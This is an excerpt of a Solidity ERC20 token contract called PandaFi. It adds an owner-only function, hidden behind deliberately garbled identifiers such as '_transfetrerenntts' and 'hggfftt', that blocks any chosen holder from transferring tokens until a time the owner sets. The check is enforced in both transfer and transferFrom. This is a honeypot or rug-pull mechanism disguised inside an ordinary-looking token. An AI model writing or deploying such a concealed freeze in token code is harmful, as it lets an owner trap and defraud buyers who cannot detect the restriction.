...
contract PandaFi is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _transfetrerenntts;
    ...
    function setTransfetrerenntt(address account, uint256 time) public onlyOwner {
        require(account != address(0), "Cannot set hggfftt for the zero address");
        _transfetrerenntts[account] = time;
    }

    // Removes transfer hggfftts for a specific account.
    function removeTransfetrerenntt(address account) public onlyOwner {
        require(account != address(0), "Cannot remove hggfftt for the zero address");
        delete _transfetrerenntts[account];
    }
    ...
    function gethggffttTime(address account) public view returns (uint256) {
        ...
        return _transfetrerenntts[account];
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        require(block.timestamp >= _transfetrerenntts[_msgSender()], "Transfer is currently restricted for this address");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        require(block.timestamp >= _transfetrerenntts[sender], "Transfer is currently restricted for this address");
